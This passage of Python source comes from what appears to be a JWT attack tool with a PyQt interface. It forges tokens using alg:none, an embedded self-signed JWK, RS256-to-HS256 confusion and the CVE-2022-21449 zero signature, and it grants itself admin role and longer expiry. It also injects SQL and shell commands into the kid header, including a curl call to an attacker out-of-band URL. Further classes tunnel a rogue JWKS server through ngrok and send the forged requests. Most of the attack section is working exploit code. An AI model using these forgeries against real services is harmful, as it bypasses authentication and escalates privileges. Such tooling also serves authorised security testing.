                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            pub = private_key.public_key()
            pub_numbers = pub.public_numbers()

            def _int_to_b64(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return _b64url_encode(n.to_bytes(length, "big"))

            # ── kid must match in BOTH the header AND the embedded JWK ──
            attacker_kid = str(uuid.uuid4())
            jwk = {
                "kty": "RSA",
                "kid": attacker_kid,
                "n": _int_to_b64(pub_numbers.n),
                "e": _int_to_b64(pub_numbers.e),
                "alg": "RS256",
                "use": "sig",
            }

            def _sign_rs256(hdr: dict, pay: dict) -> str:
                hdr["alg"] = "RS256"
                hdr["kid"] = attacker_kid   # matching kid
                hdr["jwk"] = jwk
                hdr.pop("jku", None)
                hdr.pop("x5u", None)
                h_b64 = _encode_part(hdr)
                p_b64 = _encode_part(pay)
                msg = f"{h_b64}.{p_b64}".encode()
                sig_bytes = private_key.sign(msg, padding.PKCS1v15(), hashes.SHA256())
                return f"{h_b64}.{p_b64}.{_b64url_encode(sig_bytes)}"

            import time as _time
            results: List[Tuple[str, str]] = []

            # Variant 1: original claims — pure bypass probe
            results.append((
                "Embedded JWK – original claims (self-signed RS256)",
                _sign_rs256(dict(header), dict(payload)),
            ))

            # Variant 2: expiry extended +1 year
            p_exp = dict(payload)
            if "exp" in p_exp:
                p_exp["exp"] = int(p_exp["exp"]) + 86400 * 365
            else:
                p_exp["exp"] = int(_time.time()) + 86400 * 365
            results.append((
                "Embedded JWK – exp extended +1yr",
                _sign_rs256(dict(header), p_exp),
            ))

            # Variant 3: privilege escalation claims
            for changes, label in [
                ({"role": "admin", "isAdmin": True}, "role=admin"),
                ({"roles": ["admin", "superadmin"], "scope": "admin:write admin:read"}, "roles=[admin,superadmin]"),
                ({"sub": "administrator", "role": "admin", "isAdmin": True}, "sub=administrator"),
            ]:
                p_esc = dict(payload)
                p_esc.update(changes)
                results.append((
                    f"Embedded JWK – {label}",
                    _sign_rs256(dict(header), p_esc),
                ))

            # Variant 4: combined ext exp + admin
            p_both = dict(payload)
            p_both["exp"] = int(_time.time()) + 86400 * 365
            p_both.update({"role": "admin", "isAdmin": True})
            results.append((
                "Embedded JWK – exp extended + role=admin",
                _sign_rs256(dict(header), p_both),
            ))

            return results

        except ImportError:
            # Fallback: HS256 with dummy embedded jwk — still exercises the
            # header-injection code path even without the cryptography package.
            attacker_kid = str(uuid.uuid4())
            dummy_jwk = {
                "kty": "oct",
                "kid": attacker_kid,
                "k": _b64url_encode(b"attacker-key"),
                "alg": "HS256",
            }
            results: List[Tuple[str, str]] = []
            for pay_changes, label in [
                ({}, "original claims"),
                ({"role": "admin", "isAdmin": True}, "role=admin"),
            ]:
                h = dict(header)
                h["alg"] = "HS256"
                h["kid"] = attacker_kid
                h["jwk"] = dummy_jwk
                h.pop("jku", None)
                p = dict(payload)
                p.update(pay_changes)
                h_b64 = _encode_part(h)
                p_b64 = _encode_part(p)
                sig = _sign_hs256(h_b64, p_b64, b"attacker-key")
                results.append((
                    f"Embedded JWK HS256 fallback – {label}",
                    f"{h_b64}.{p_b64}.{sig}",
                ))
            return results

    # ── Forge: null subject ───────────────────────────────────────────────
    @staticmethod
    def forge_null_values(header: dict, payload: dict,
                          secret: bytes = b"secret") -> List[Tuple[str, str]]:
        """Try null/empty sub, user, id claims — may bypass authorization checks."""
        variants = [
            {"sub": None},
            {"sub": ""},
            {"sub": "null"},
            {"sub": "*"},
            {"user_id": None},
            {"user_id": ""},
        ]
        results = []
        for changes in variants:
            p = dict(payload)
            p.update(changes)
            h_b64 = _encode_part(header)
            p_b64 = _encode_part(p)
            sig = _sign_hs256(h_b64, p_b64, secret)
            token = f"{h_b64}.{p_b64}.{sig}"
            changes_str = ", ".join(f"{k}={v!r}" for k, v in changes.items())
            results.append((f"Null claim: {changes_str}", token))
        return results

    # ── Forge: claim fuzzing ───────────────────────────────────────────────
    @staticmethod
    def forge_claim_fuzz(header: dict, payload: dict,
                         claim_name: str,
                         values: List[str],
                         secret: bytes = b"") -> List[Tuple[str, str]]:
        """
        For each value in *values*, replace payload[claim_name] with that value
        and produce a token.  Generates variants per value:
          - alg:none  (empty signature — works even without a known secret)
          - HS256     (signed with *secret* when provided)
        Numbers, booleans and null are cast to the appropriate Python type so the
        JWT payload looks native (no string "true" where a boolean is expected).
        """
        results = []
        for raw_val in values:
            v = raw_val.strip()
            if v.lower() == "true":
                typed: Any = True
            elif v.lower() == "false":
                typed: Any = False
            elif v.lower() in ("null", "none", ""):
                typed: Any = None
            else:
                try:
                    typed = int(v)
                except ValueError:
                    try:
                        typed = float(v)
                    except ValueError:
                        typed = v

            p = dict(payload)
            p[claim_name] = typed

            # alg:none variants (signature stripped — no secret required)
            for alg_str in ["none", "None", "NONE"]:
                h = dict(header)
                h["alg"] = alg_str
                h_b64 = _encode_part(h)
                p_b64 = _encode_part(p)
                results.append((f"{claim_name}={v!r} [alg:{alg_str}]", f"{h_b64}.{p_b64}."))

            # HS256 signed variant (only when a known secret is configured)
            if secret:
                h = dict(header)
                h["alg"] = "HS256"
                h_b64 = _encode_part(h)
                p_b64 = _encode_part(p)
                sig = _sign_hs256(h_b64, p_b64, secret)
                results.append((f"{claim_name}={v!r} [HS256]", f"{h_b64}.{p_b64}.{sig}"))

        return results

    @staticmethod
    def forge_alg_none_priv_esc(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Combined attack: alg:none + elevated privilege claims.
        Produces unsigned tokens with common admin-role permutations.
        """
        escalation_sets = [
            {"role": "admin", "isAdmin": True},
            {"roles": ["admin", "superadmin"], "scope": "admin write read"},
            {"sub": "administrator", "role": "admin", "isAdmin": True},
        ]
        results = []
        for changes in escalation_sets:
            p = dict(payload)
            p.update(changes)
            for alg_str in ["none", "None", "NONE"]:
                h = dict(header)
                h["alg"] = alg_str
                h_b64 = _encode_part(h)
                p_b64 = _encode_part(p)
                label = ", ".join(f"{k}={v}" for k, v in changes.items())
                results.append((f"alg:{alg_str} + {label[:42]}", f"{h_b64}.{p_b64}."))
        return results

    @staticmethod
    def forge_alg_none_exp_extend(header: dict, payload: dict,
                                  extra_seconds: int = 86400 * 365) -> List[Tuple[str, str]]:
        """
        Combined attack: alg:none + exp extension.
        Produces unsigned tokens with exp moved far into the future.
        """
        p = dict(payload)
        now = int(time.time())
        p["exp"] = now + extra_seconds
        if "iat" in p:
            p["iat"] = now
        if "nbf" in p:
            p["nbf"] = now - 10

        results = []
        for alg_str in ["none", "None", "NONE"]:
            h = dict(header)
            h["alg"] = alg_str
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(p)
            results.append((f"alg:{alg_str} + exp+1y", f"{h_b64}.{p_b64}."))
        return results

    @staticmethod
    def forge_alg_none_null_claims(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Combined attack: alg:none + null/empty identity claim variants.
        """
        variants = [
            {"sub": None},
            {"sub": ""},
            {"sub": "null"},
            {"user_id": None},
            {"user_id": ""},
        ]
        results = []
        for changes in variants:
            p = dict(payload)
            p.update(changes)
            for alg_str in ["none", "None", "NONE"]:
                h = dict(header)
                h["alg"] = alg_str
                h_b64 = _encode_part(h)
                p_b64 = _encode_part(p)
                label = ", ".join(f"{k}={v!r}" for k, v in changes.items())
                results.append((f"alg:{alg_str} + null-claim {label}", f"{h_b64}.{p_b64}."))
        return results

    @staticmethod
    def forge_kid_sqli_alg_none(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Combined attack: kid SQLi payloads + alg:none.
        Targets parsers that both trust alg:none and misuse kid in key lookup SQL.
        """
        kid_payloads = [
            "x' UNION SELECT '1';--",
            "' UNION SELECT 'secret'-- -",
            "' UNION SELECT 0x7365637265742d6b6579-- -",
            "' UNION SELECT CHAR(115,101,99,114,101,116)-- -",
            "' OR SLEEP(0)-- -",
        ]
        results = []
        for kid_val in kid_payloads:
            for alg_str in ["none", "None", "NONE"]:
                h = dict(header)
                h["kid"] = kid_val
                h["alg"] = alg_str
                h_b64 = _encode_part(h)
                p_b64 = _encode_part(payload)
                results.append((f"kid SQLi + alg:{alg_str}", f"{h_b64}.{p_b64}."))
        return results

    @staticmethod
    def forge_jku_priv_esc(header: dict, payload: dict,
                           attacker_url: str,
                           secret: bytes = b"secret",
                           trusted_domain: str = "",
                           km_key_data: Optional[dict] = None) -> List[Tuple[str, str]]:
        """
        Thin wrapper: forge_jku_injection already includes privilege-escalation
        variants signed with the attacker RSA private key.
        """
        variants, _ = JWTEngine.forge_jku_injection(
            header, payload, attacker_url, secret,
            trusted_domain=trusted_domain, km_key_data=km_key_data
        )
        return variants

    @staticmethod
    def forge_embedded_jwk_priv_esc(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Thin wrapper: forge_embedded_jwk already includes the priv-esc variants.
        """
        return JWTEngine.forge_embedded_jwk(header, payload)

    @staticmethod
    def forge_alg_confusion_priv_esc(header: dict, payload: dict,
                                     public_key_pem: str) -> List[Tuple[str, str]]:
        """
        Combined: RS256→HS256 algorithm confusion AND privilege-escalation claims.
        The server uses the RSA public key as an HS256 secret AND sees elevated claims.
        """
        escalation_sets = [
            {"role": "admin", "isAdmin": True},
            {"roles": ["admin", "superadmin"]},
        ]
        secret = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
        results = []
        for changes in escalation_sets:
            h = dict(header)
            h["alg"] = "HS256"
            p = dict(payload)
            p.update(changes)
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(p)
            sig = _sign_hs256(h_b64, p_b64, secret)
            token = f"{h_b64}.{p_b64}.{sig}"
            label = ", ".join(f"{k}={v}" for k, v in changes.items())
            results.append((f"RS256→HS256 + {label[:40]}", token))
        return results

    @staticmethod
    def forge_full_bypass(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Combined maximum-impact: alg:none + admin claims + extended expiry + null sub.
        One-shot token that tries every bypass dimension at once.
        """
        results = []
        for alg_str in ["none", "None", "NONE"]:
            h = dict(header)
            h["alg"] = alg_str
            p = dict(payload)
            p["role"] = "admin"
            p["isAdmin"] = True
            p["roles"] = ["admin", "superadmin"]
            p["scope"] = "admin write read delete"
            p["exp"] = int(time.time()) + 86400 * 365
            if "nbf" in p:
                p["nbf"] = int(time.time()) - 10
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(p)
            token = f"{h_b64}.{p_b64}."   # empty signature
            results.append((f"FULL BYPASS alg:{alg_str} (admin+exp+nosig)", token))
        return results

    # ── Psychic Signature (CVE-2022-21449) ───────────────────────────────
    @staticmethod
    def forge_psychic_signature(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        CVE-2022-21449: ECDSA 'Psychic Signature' attack.
        Some ECDSA implementations accept a zero-value (r=0, s=0) signature,
        DER-encoded as MAYCAQACAQA, without verifying it against the key.
        """
        results = []
        for alg in ["ES256", "ES384", "ES512"]:
            h = dict(header)
            h["alg"] = alg
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(payload)
            token = f"{h_b64}.{p_b64}.MAYCAQACAQA"
            results.append((f"Psychic Sig ({alg}) CVE-2022-21449", token))
        return results

    # ── Blank password ────────────────────────────────────────────────────
    @staticmethod
    def forge_blank_password(header: dict, payload: dict) -> Tuple[str, str]:
        """Sign with HS256 using an empty-string secret — catches blank/default secrets."""
        h = dict(header)
        h["alg"] = "HS256"
        h_b64 = _encode_part(h)
        p_b64 = _encode_part(payload)
        sig = _sign_hs256(h_b64, p_b64, b"")
        token = f"{h_b64}.{p_b64}.{sig}"
        return "Blank password (empty HS256 secret)", token

    # ── kid Command Injection (RCE) ───────────────────────────────────────
    @staticmethod
    def forge_kid_rce(header: dict, payload: dict,
                      oob_url: str = "") -> List[Tuple[str, str]]:
        """
        Inject OS command payloads into the kid header.
        Token is signed with empty secret (null key file result).
        If oob_url is set, an OOB curl command is also tested.
        """
        rce_kids = [
            ("kid RCE (sleep 10)",  "|sleep 10"),
            ("kid RCE (id)",        "| id"),
            ("kid RCE (whoami)",    "| whoami"),
        ]
        results = []
        for name, kid_val in rce_kids:
            h = dict(header)
            h["kid"] = kid_val
            h["alg"] = "HS256"
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(payload)
            sig = _sign_hs256(h_b64, p_b64, b"")
            token = f"{h_b64}.{p_b64}.{sig}"
            results.append((name, token))
        if oob_url:
            h = dict(header)
            h["kid"] = f"| curl {oob_url}/kid_rce"
            h["alg"] = "HS256"
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(payload)
            sig = _sign_hs256(h_b64, p_b64, b"")
            token = f"{h_b64}.{p_b64}.{sig}"
            results.append(("kid RCE (curl OOB)", token))
        return results

    # ── Type confusion injection ──────────────────────────────────────────
    @staticmethod
    def forge_type_confusion(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Inject dangerous types (null / True / False / 0 / fuzz string) into every
        existing header and payload claim.  Useful for triggering unhandled-type
        errors that reveal whether claims are processed before signature validation.
        """
        inject_vals: List[Any] = [None, True, False, 0, "forge_test"]
        results = []
        for val in inject_vals:
            for claim in list(header.keys()):
                if claim in ("alg", "typ"):
                    continue
                h = dict(header)
                h[claim] = val
                h_b64 = _encode_part(h)
                p_b64 = _encode_part(payload)
                results.append((f"TypeConf hdr:{claim}={val!r}", f"{h_b64}.{p_b64}."))
            for claim in list(payload.keys()):
                p = dict(payload)
                p[claim] = val
                h_b64 = _encode_part(header)
                p_b64 = _encode_part(p)
                results.append((f"TypeConf pld:{claim}={val!r}", f"{h_b64}.{p_b64}."))
        return results

    # ── SSRF via claim injection ──────────────────────────────────────────
    @staticmethod
    def forge_ssrf_claims(header: dict, payload: dict,
                          oob_url: str) -> List[Tuple[str, str]]:
        """
        Replace every header and payload claim value with an attacker-controlled URL
        pointing to a unique path.  Monitor your listener for HTTP interactions to
        identify which claims are fetched by the server.
        """
        results = []
        for claim in list(header.keys()):
            if claim in ("alg", "typ"):
                continue
            h = dict(header)
            h[claim] = f"{oob_url}/hdr_{claim}"
            h_b64 = _encode_part(h)
            p_b64 = _encode_part(payload)
            results.append((f"SSRF hdr:{claim}", f"{h_b64}.{p_b64}."))
        for claim in list(payload.keys()):
            p = dict(payload)
            p[claim] = f"{oob_url}/pld_{claim}"
            h_b64 = _encode_part(header)
            p_b64 = _encode_part(p)
            results.append((f"SSRF pld:{claim}", f"{h_b64}.{p_b64}."))
        return results

    # ── Reflected claims ─────────────────────────────────────────────────
    @staticmethod
    def forge_reflected_claims(header: dict, payload: dict) -> List[Tuple[str, str]]:
        """
        Replace each payload claim with a unique canary value while keeping the
        original (now invalid) signature.  If the server reflects the canary back
        in its response, the claim is processed before signature validation.
        """
        results = []
        for claim in list(payload.keys()):
            canary = "forge_" + hashlib.md5(f"rc_{claim}".encode()).hexdigest()[:8]
            p = dict(payload)
            p[claim] = canary
            h_b64 = _encode_part(header)
            p_b64 = _encode_part(p)
            results.append((f"Reflected {claim}={canary}", f"{h_b64}.{p_b64}."))
        return results


# ─────────────────────────────────────────────────────────────────────────────
# Syntax highlighter for JWT / JSON
# ─────────────────────────────────────────────────────────────────────────────

class JWTHighlighter(QSyntaxHighlighter):
    """Colour-codes the three JWT parts: header (blue), payload (green), signature (red)."""

    def __init__(self, document):
        super().__init__(document)
        self._fmt_header = self._fmt("#61AFEF", bold=True)
        self._fmt_payload = self._fmt("#98C379")
        self._fmt_dot = self._fmt(COLOR_TEXT_MUTED, bold=True)
        self._fmt_sig = self._fmt("#E06C75")

    @staticmethod
    def _fmt(color: str, bold: bool = False) -> QTextCharFormat:
        f = QTextCharFormat()
        f.setForeground(QColor(color))
        if bold:
            f.setFontWeight(QFont.Bold)
        return f

    def highlightBlock(self, text: str):
        # Find JWT pattern in the block
        pat = re.compile(r'(eyJ[\w\-]*)(\.)([A-Za-z0-9\-_]*)(\.)([A-Za-z0-9\-_]*)')
        for m in pat.finditer(text):
            self.setFormat(m.start(1), len(m.group(1)), self._fmt_header)
            self.setFormat(m.start(2), 1, self._fmt_dot)
            self.setFormat(m.start(3), len(m.group(3)), self._fmt_payload)
            self.setFormat(m.start(4), 1, self._fmt_dot)
            self.setFormat(m.start(5), len(m.group(5)), self._fmt_sig)


class JSONHighlighter(QSyntaxHighlighter):
    """Simple JSON syntax highlighter."""

    def __init__(self, document):
        super().__init__(document)
        rules = [
            (r'"([^"\\]|\\.)*":\s*', QColor("#61AFEF")),    # key
            (r':\s*"([^"\\]|\\.)*"', QColor("#98C379")),     # string value
            (r'\b(true|false|null)\b', QColor("#E5C07B")),   # keyword
            (r'\b-?\d+(\.\d+)?([eE][+-]?\d+)?\b', QColor("#D19A66")),  # number
        ]
        self._rules = []
        for pattern, color in rules:
            fmt = QTextCharFormat()
            fmt.setForeground(color)
            self._rules.append((re.compile(pattern), fmt))

    def highlightBlock(self, text: str):
        for pat, fmt in self._rules:
            for m in pat.finditer(text):
                self.setFormat(m.start(), m.end() - m.start(), fmt)


# ─────────────────────────────────────────────────────────────────────────────
# Ngrok Tunnel — exposes the local JWKS server via a public HTTPS URL
# ─────────────────────────────────────────────────────────────────────────────

class NgrokTunnel(QThread):
    """Start an ngrok HTTP tunnel in the background and emit the public URL.

    Uses either:
      - The pyngrok library (``pip install pyngrok``) if available, or
      - A subprocess calling the ``ngrok`` CLI binary found on PATH.

    Signals:
        tunnel_ready(public_url)   — emitted once the public URL is known
        tunnel_error(message)      — emitted if ngrok fails to start
        tunnel_stopped()           — emitted when the tunnel is torn down
        tunnel_log(line)           — emitted for each ngrok log line (for UI display)
    """

    tunnel_ready   = pyqtSignal(str)   # public HTTPS URL
    tunnel_error   = pyqtSignal(str)   # error message
    tunnel_stopped = pyqtSignal()
    tunnel_log     = pyqtSignal(str)   # raw ngrok log line for display

    def __init__(self, port: int, auth_token: str = "", parent=None):
        super().__init__(parent)
        self._port       = port
        self._auth_token = auth_token.strip()
        self._stop_flag  = False
        self._proc       = None   # subprocess.Popen handle (CLI path)
        self._pyngrok_tunnel = None

    def stop(self):
        """Tear down the tunnel."""
        self._stop_flag = True
        # pyngrok path
        if self._pyngrok_tunnel is not None:
            try:
                from pyngrok import ngrok as _ngrok
                pub = getattr(self._pyngrok_tunnel, "public_url", None)
                if pub:
                    _ngrok.disconnect(pub)
                else:
                    _ngrok.kill()
            except Exception:
                pass
            self._pyngrok_tunnel = None
        # CLI subprocess path
        if self._proc is not None:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None
        self.tunnel_stopped.emit()

    # ── helpers ───────────────────────────────────────────────────────────
    @staticmethod
    def _auth_hint(text: str) -> str:
        """Return a settings hint when the error is auth-related."""
        keywords = ("authtoken", "authentication failed", "verified account",
                    "ERR_NGROK_4018", "ERR_NGROK_105", "ERR_NGROK_302",
                    "ERR_NGROK_8012", "account is limited")
        if any(k.lower() in text.lower() for k in keywords):
            return "\n\nSet your ngrok authtoken in:  Tools ➜ ⚙ Settings ➜ 🔑 Tokens"
        return ""

    def _register_authtoken(self, ngrok_bin: str, env: dict) -> Optional[str]:
        """Run 'ngrok config add-authtoken' to write token to ngrok's config file.
        Returns an error string on failure, or None on success."""
        import subprocess as _sp
        try:
            r = _sp.run(
                [ngrok_bin, "config", "add-authtoken", self._auth_token],
                capture_output=True, text=True, timeout=10, env=env
            )
            if r.returncode != 0:
                out = (r.stdout + r.stderr).strip()
                return out or f"'ngrok config add-authtoken' exited {r.returncode}"
        except Exception as exc:
            return str(exc)
        return None

    def run(self):
        """Try pyngrok first, fall back to ngrok CLI with JSON log parsing."""
        import subprocess, shutil, json as _json, queue, threading

        # ── Attempt 1: pyngrok library ─────────────────────────────────────
        try:
            from pyngrok import ngrok as _ngrok
            if self._auth_token:
                _ngrok.set_auth_token(self._auth_token)
            tunnel = _ngrok.connect(self._port, "http")
            self._pyngrok_tunnel = tunnel
            public_url = getattr(tunnel, "public_url", None) or ""
            if not public_url:
                self.tunnel_error.emit(
                    "pyngrok connected but returned an empty public URL.\n"
                    "Ensure your authtoken is set in  Tools ➜ ⚙ Settings ➜ 🔑 Tokens."
                )
                return
            if public_url.startswith("http://"):
                public_url = "https://" + public_url[7:]
            self.tunnel_ready.emit(public_url)
            while not self._stop_flag:
                self.msleep(500)
            return

        except ImportError:
            pass  # pyngrok not installed — fall through to CLI

        except Exception as exc:
            msg = str(exc)
            self.tunnel_error.emit(f"pyngrok: {msg}{self._auth_hint(msg)}")
            return

        # ── Attempt 2: ngrok CLI ───────────────────────────────────────────
        ngrok_bin = shutil.which("ngrok")
        if not ngrok_bin:
            self.tunnel_error.emit(
                "ngrok binary not found on PATH.\n\n"
                "Install options:\n"
                "  pip install pyngrok          (recommended)\n"
                "  — or —\n"
                "  Download the ngrok binary from https://ngrok.com/download\n"
                "  and place it on your PATH."
            )
            return

        env = __import__("os").environ.copy()
        if self._auth_token:
            # Pass via env var AND write to config file (ngrok v3 prefers config file)
            env["NGROK_AUTHTOKEN"] = self._auth_token
            self.tunnel_log.emit("[ngrok] Registering authtoken with ngrok config …")
            err = self._register_authtoken(ngrok_bin, env)
            if err:
                self.tunnel_log.emit(f"[ngrok] Warning: config add-authtoken failed: {err}")
                # Not fatal — env var is still set, continue anyway

        # Kill any leftover ngrok processes from previous sessions.
        # They keep their endpoint alive on ngrok's servers (causes ERR_NGROK_334).
        try:
            import signal as _signal, os as _os
            result = subprocess.run(
                ["pgrep", "-f", "ngrok"],
                capture_output=True, text=True, timeout=3
            )
            pids = [int(p) for p in result.stdout.split() if p.strip().isdigit()]
            if pids:
                # SIGTERM first, then SIGKILL if still alive
                for pid in pids:
                    try:
                        _os.kill(pid, _signal.SIGTERM)
                        self.tunnel_log.emit(f"[ngrok] Terminating stale ngrok process (PID {pid}) …")
                    except ProcessLookupError:
                        pass
                # Wait up to 3 s for them to exit
                deadline = __import__('time').time() + 3
                while __import__('time').time() < deadline:
                    still_alive = []
                    for pid in pids:
                        try:
                            _os.kill(pid, 0)  # 0 = existence check
                            still_alive.append(pid)
                        except ProcessLookupError:
                            pass
                    if not still_alive:
                        break
                    self.msleep(200)
                # Force-kill anything still alive
                for pid in pids:
                    try:
                        _os.kill(pid, _signal.SIGKILL)
                        self.tunnel_log.emit(f"[ngrok] Force-killed PID {pid}")
                    except ProcessLookupError:
                        pass
                # Wait for ngrok's server to deregister the endpoint (~8 s typical)
                self.tunnel_log.emit("[ngrok] Waiting for endpoint to deregister on ngrok servers …")
                self.msleep(8000)
                if self._stop_flag:
                    return
        except Exception as ex:
            self.tunnel_log.emit(f"[ngrok] Warning while cleaning stale processes: {ex}")

        # Launch ngrok with structured JSON logging on stdout.
        cmd = [ngrok_bin, "http", str(self._port),
               "--log=stdout", "--log-format=json"]

        MAX_ATTEMPTS = 2
        for attempt in range(MAX_ATTEMPTS):
            try:
                self._proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    env=env,
                    bufsize=1,          # line-buffered
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                )
            except Exception as exc:
                self.tunnel_error.emit(f"Failed to launch ngrok: {exc}")
                return

            result_q: queue.Queue = queue.Queue()
            proc_ref = self._proc   # capture for the closure

            def _read_log(q=result_q, proc=proc_ref):
                """Read ngrok JSON log lines and push URL / error / retry signal."""
                try:
                    while True:
                        raw_line = proc.stdout.readline()
                        if not raw_line:        # EOF — process exited
                            break
                        line = raw_line.strip()
                        if not line:
                            continue
                        try:
                            ev = _json.loads(line)
                            lvl = ev.get("lvl", ev.get("level", "info"))
                            msg = ev.get("msg", "")
                            err = ev.get("err", "")
                            url = ev.get("url", "") or ev.get("public_url", "")
                            display = f"[ngrok:{lvl}] {msg}" + (f" — {err}" if err else "")
                            self.tunnel_log.emit(display)

                            # ── success ──
                            if url and url.startswith("http"):
                                q.put(("ok", url))
                                return

                            # ── endpoint already online → retryable ──
                            if "ERR_NGROK_334" in err or "already online" in msg.lower():
                                q.put(("retry", err or msg))
                                return

                            # ── other fatal error ──
                            if lvl in ("crit", "eror", "error"):
                                q.put(("err", err or msg))
                                return

                        except _json.JSONDecodeError:
                            self.tunnel_log.emit(f"[ngrok] {line}")

                except Exception as exc:
                    q.put(("err", str(exc)))
                    return

                q.put(("err", "ngrok exited without providing a tunnel URL"))

            reader = threading.Thread(target=_read_log, daemon=True)
            reader.start()

            try:
                kind, value = result_q.get(timeout=25)
            except queue.Empty:
                kind, value = "err", "ngrok timeout: no tunnel URL within 25 s"

            if self._stop_flag:
                return

            if kind == "ok":
                public_url = value
                if public_url.startswith("http://"):
                    public_url = "https://" + public_url[7:]
                self.tunnel_ready.emit(public_url)
                # Keep alive; detect unexpected process exit
                while not self._stop_flag:
                    self.msleep(500)
                    if self._proc and self._proc.poll() is not None:
                        self.tunnel_error.emit("ngrok process exited unexpectedly.")
                        break
                return

            elif kind == "retry" and attempt < MAX_ATTEMPTS - 1:
                # Previous endpoint still active on ngrok servers — wait for it to expire
                self.tunnel_log.emit(
                    "[ngrok] Previous endpoint still active (ERR_NGROK_334) — "
                    "waiting 5 s for it to expire, then retrying …"
                )
                if self._proc:
                    try:
                        self._proc.terminate()
                        self._proc.wait(timeout=3)
                    except Exception:
                        pass
                    self._proc = None
                self.msleep(5000)
                if self._stop_flag:
                    return
                continue  # retry

            else:
                hint = self._auth_hint(value)
                if "ERR_NGROK_334" in value or "already online" in value.lower():
                    hint = (
                        "\n\nThe previous ngrok endpoint is still registered on ngrok's servers.\n"
                        "Wait ~30 s and try again, or log in to https://dashboard.ngrok.com\n"
                        "and delete the stale endpoint manually."
                    )
                self.tunnel_error.emit(f"ngrok error: {value}{hint}")
                if self._proc:
                    self._proc.terminate()
                return


# ─────────────────────────────────────────────────────────────────────────────
# Local JWKS Server — serves a JWKS JSON over HTTP for JKU injection detection
# ─────────────────────────────────────────────────────────────────────────────

class LocalJWKSServer(QThread):
    """Lightweight HTTP server that serves a JWKS JSON at a configurable path.

    JKU detection workflow:
      1. Generate an RSA key in Key Manager.
      2. Start server → it serves ``{"keys": [<pub_jwk>]}`` at
         ``http://127.0.0.1:<port><path>``.
      3. Run JKU attacks with Attacker URL set to that endpoint.
      4. If the target app fetches the JWKS URL, the request appears in the
         access log — confirming the JKU injection is live.
    """

    request_received = pyqtSignal(str, str, str, str, str)  # ts, ip, method, path, ua
    server_started   = pyqtSignal(str)   # listening URL
    server_error     = pyqtSignal(str)   # error message

    def __init__(self, port: int, path: str, jwks_json: str, parent=None):
        super().__init__(parent)
        self._port = port
        self._path = path if path.startswith("/") else "/" + path
        self._jwks_json = jwks_json
        self._server = None
        self._lock = threading.Lock()

    def set_jwks(self, jwks_json: str):
        """Hot-update the served JWKS without restarting the server."""
        with self._lock:
            self._jwks_json = jwks_json

    def stop(self):
        srv = self._server
        if srv is not None:
            try:
                srv.shutdown()       # stops serve_forever()
            except Exception:
                pass
            try:
                srv.server_close()   # closes the socket — frees the port immediately
            except Exception:
                pass
            self._server = None

    def run(self):
        import http.server as _hs
        import datetime as _dt
        import socket as _socket
        serve_path = self._path
        outer = self

        class _ReuseServer(_hs.HTTPServer):
            # Force SO_REUSEADDR so restarts can bind immediately
            allow_reuse_address = True
            def server_bind(self):
                self.socket.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
                super().server_bind()

        class _Handler(_hs.BaseHTTPRequestHandler):
            def do_GET(self):
                ts = _dt.datetime.now().strftime("%H:%M:%S.%f")[:-3]
                ua = self.headers.get("User-Agent", "—")
                outer.request_received.emit(
                    ts, self.client_address[0], "GET", self.path, ua
                )
                path_clean = self.path.split("?")[0].split("#")[0]
                if path_clean == serve_path:
                    with outer._lock:
                        body = outer._jwks_json.encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(body)))
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_HEAD(self):
                # Some JWT libraries probe with HEAD before GET
                ts = _dt.datetime.now().strftime("%H:%M:%S.%f")[:-3]
                ua = self.headers.get("User-Agent", "—")
                outer.request_received.emit(
                    ts, self.client_address[0], "HEAD", self.path, ua
                )
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()

            def log_message(self, fmt, *args):
                pass  # suppress noisy console output

        try:
            self._server = _ReuseServer(("0.0.0.0", self._port), _Handler)
            self.server_started.emit(f"http://127.0.0.1:{self._port}{self._path}")
            self._server.serve_forever()
        except Exception as exc:
            self.server_error.emit(str(exc))
        finally:
            # Always close the socket when the thread exits
            if self._server:
                try:
                    self._server.server_close()
                except Exception:
                    pass
                self._server = None


# ─────────────────────────────────────────────────────────────────────────────
# Worker thread for sending HTTP requests
# ─────────────────────────────────────────────────────────────────────────────

class RequestWorker(QThread):
    """Send modified HTTP requests in a background thread."""
    result_ready = pyqtSignal(int, int, str, dict, float, str, str)   # row, status, body, headers, elapsed, error, sent_req
    all_done = pyqtSignal()

    def __init__(self, tasks: list, delay_ms: int = 0, timeout_s: int = 20,
                 extra_headers: Optional[Dict[str, str]] = None, parent=None):
        """
        tasks: list of (row_index, raw_request, host, port, is_https, token_to_inject, jwt_location)
        delay_ms: milliseconds to sleep between requests (0 = no delay)
        timeout_s: per-request TCP timeout in seconds
        extra_headers: additional HTTP headers merged into every outgoing request
        """
        super().__init__(parent)
        self._tasks = tasks
        self._delay_ms = delay_ms
        self._timeout_s = timeout_s
        self._extra_headers = extra_headers or {}
        self._stop = False

    def stop(self):
        self._stop = True

    def run(self):
        import time as _time
        for task in self._tasks:
            if self._stop:
                break
            row, raw_request, host, port, is_https, token, location = task
            try:
                status, body, headers, elapsed, sent_req = _send_http_request(
                    raw_request, host, port, is_https, token, location,
                    timeout_s=self._timeout_s,
